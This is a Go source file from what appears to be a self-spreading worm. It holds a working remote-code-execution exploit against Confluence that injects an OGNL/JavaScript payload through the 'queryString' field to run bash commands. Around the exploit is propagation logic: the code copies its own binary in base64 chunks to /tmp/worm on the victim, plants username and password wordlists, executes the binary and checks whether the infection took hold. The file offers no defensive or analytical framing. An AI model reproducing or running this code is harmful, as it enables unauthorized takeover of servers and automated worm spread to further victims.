package infection

import (
	"io/ioutil"
	"log"
	"net/http"
  "net/url"
	"strings"
	"encoding/base64"
	"fmt"
)


func ConfluenceCmdExecute(targetUrl string, endpoint string, cmd string) string {

  exploitUrl := targetUrl + endpoint

  postData := make(url.Values)
  postData.Add("queryString", "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var cmd = new java.lang.String(\\u0022" + cmd + "\\u0022);var p = new java.lang.ProcessBuilder(); p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027")

  response, err := http.PostForm(exploitUrl, postData)

  if err != nil {
    log.Fatal("An Error Occured %v", err)
  }

  defer response.Body.Close()

  body, err := ioutil.ReadAll(response.Body)
  if err != nil {
    log.Fatal(err)
  }
  sb := string(body)

  //log.Println(sb)

  return sb
  }

	func ConfluenceCheckInfection(url string, endpoint string) bool {
		command := fmt.Sprintf("ls %s", wormPath)
		resp := ConfluenceCmdExecute(url, endpoint, command)
		return strings.Contains(resp, "aaaaaaaa["+wormPath)
	}

  func CopyWorm(url string, endpoint string,worm64 string, wormPath string) {
    wormPath2 := "/tmp/worm.b64"
    length := len(worm64)
    slice := 130000
    begin := 0
    end := begin+slice
    if end >= length {
      end = length
    }
    copyWorm := worm64[begin:end]
    command := fmt.Sprintf("echo -n %s | tee %s",copyWorm,wormPath2)
    ConfluenceCmdExecute(url, endpoint, command)
    begin = end
    end = end+slice
    for begin < length {
      if end >= length {
        end = length
      }
      copyWorm := worm64[begin:end]
      command = fmt.Sprintf("echo -n %s | tee -a %s",copyWorm,wormPath2)
      ConfluenceCmdExecute(url, endpoint, command)
      begin = end
      end = end+slice
    }
    command = fmt.Sprintf("cat %s | base64 -d | tee %s",wormPath2,wormPath)
    ConfluenceCmdExecute(url, endpoint, command)
    return
  }

	func ConfluenceInfect(url string, endpoint string) bool {
    wormPath := "/tmp/worm"
		var worm []byte
		var copyTemplate string

		copyTemplate = "echo %s | base64 -d | tee %s"

		worm = GetFile("/proc/self/exe")
		worm64 := base64.StdEncoding.EncodeToString(worm)
    CopyWorm(url, endpoint, worm64, wormPath)

		usersFile := GetFile("./users.txt")
		usersFile64 := base64.StdEncoding.EncodeToString(usersFile)
		command := fmt.Sprintf(copyTemplate, usersFile64, "/tmp/users.txt")
		ConfluenceCmdExecute(url, endpoint, command)

		passwordFile := GetFile("./passwords.txt")
		passwordFile64 := base64.StdEncoding.EncodeToString(passwordFile)
		command = fmt.Sprintf(copyTemplate, passwordFile64, "/tmp/passwords.txt")
		ConfluenceCmdExecute(url, endpoint, command)

		command = fmt.Sprintf("chmod u+x %s; %s", wormPath, wormPath)
		ConfluenceCmdExecute(url, endpoint, command)

		return ConfluenceCheckInfection(url, endpoint)
	}
